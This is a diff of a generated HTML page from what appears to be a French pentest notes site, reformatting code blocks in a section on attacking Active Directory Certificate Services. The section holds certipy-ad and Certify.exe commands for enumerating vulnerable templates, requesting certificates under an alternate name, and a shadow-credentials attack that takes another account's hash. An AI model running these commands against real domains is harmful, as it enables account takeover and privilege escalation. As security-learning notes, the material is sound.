@@ -7705,35 +7705,35 @@
 <p><img alt="Pasted image 20240109171310" src="../../../../../Files/Pasted%20image%2020240109171310.png" /></p>
 <h3 id="linux-certipy-ad">Linux (certipy-ad)</h3>
 <p>Installation:</p>
-<pre><code class="language-bash">pip install certipy-ad
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pip<span class="w"> </span>install<span class="w"> </span>certipy-ad
+</span></code></pre></div>
 <p>Enumération des certificats:</p>
-<pre><code class="language-bash">certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
-
-# Possibilité de récupérer les informations pour bloodhound:
-
-certipy-ad find -u john@corp.local -p Passw0rd -bloodhound -dc-ip 172.16.126.128
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>john@corp.local<span class="w"> </span>-p<span class="w"> </span>Passw0rd<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.126.128
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># Possibilité de récupérer les informations pour bloodhound:</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>john@corp.local<span class="w"> </span>-p<span class="w"> </span>Passw0rd<span class="w"> </span>-bloodhound<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">172</span>.16.126.128
+</span></code></pre></div>
 <p>Faire une demande de certificat (ici une demande du certificat User, sur le serveur de certificat corp-DC-CA et l'utilisateur john):</p>
-<pre><code class="language-bash">certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>certipy-ad<span class="w"> </span>req<span class="w"> </span>-username<span class="w"> </span>john@corp.local<span class="w"> </span>-password<span class="w"> </span>Passw0rd<span class="w"> </span>-ca<span class="w"> </span>corp-DC-CA<span class="w"> </span>-target<span class="w"> </span>ca.corp.local<span class="w"> </span>-template<span class="w"> </span>User
+</span></code></pre></div>
 <p>Si, dans bloodhound, on voit qu'un utilisateur peut écrire sur l'attribut <code>msDS-KeyCredentialLink</code> d'un autre compte, il est possible de récupérer le hash de cet autre compte (ici John peut écrire sur Jane):</p>
-<pre><code class="language-bash">certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>certipy<span class="w"> </span>shadow<span class="w"> </span>auto<span class="w"> </span>-username<span class="w"> </span>John@corp.local<span class="w"> </span>-p<span class="w"> </span>Passw0rd<span class="w"> </span>-account<span class="w"> </span>Jane
+</span></code></pre></div>
 <hr />
 <h3 id="windows-certifyexe">Windows (certify.exe)</h3>
 <p>Enumération des certificats:</p>
-<pre><code class="language-powershell">certify.exe cas
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">cas</span>
+</span></code></pre></div>
 <p>Enumérer les templates:</p>
-<pre><code class="language-powershell">certify.exe find
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span>
+</span></code></pre></div>
 <p>Enumérer les templates vulnérables aux différentes attaques :</p>
-<pre><code class="language-powershell">certify.exe find /vulnerable
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">certify</span><span class="p">.</span><span class="n">exe</span> <span class="n">find</span> <span class="p">/</span><span class="n">vulnerable</span>
+</span></code></pre></div>
 <p>Demander un certificat:</p>
-<pre><code class="language-powershell">certify.exe /ca:host-serveur-certficat\DC-CA /template:certificat-vuln /altname:nom-alternatif
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">certify</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">ca</span><span class="p">:</span><span class="n">host-serveur-certficat</span><span class="p">\</span><span class="n">DC-CA</span> <span class="p">/</span><span class="n">template</span><span class="p">:</span><span class="n">certificat-vuln</span> <span class="p">/</span><span class="n">altname</span><span class="p">:</span><span class="n">nom-alternatif</span>
+</span></code></pre></div>
 
 
 
@@ -7780,7 +7780,7 @@ certipy-ad find -u john@corp.local -p Passw0rd -bloodhound -dc-ip 172.16.126.128
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
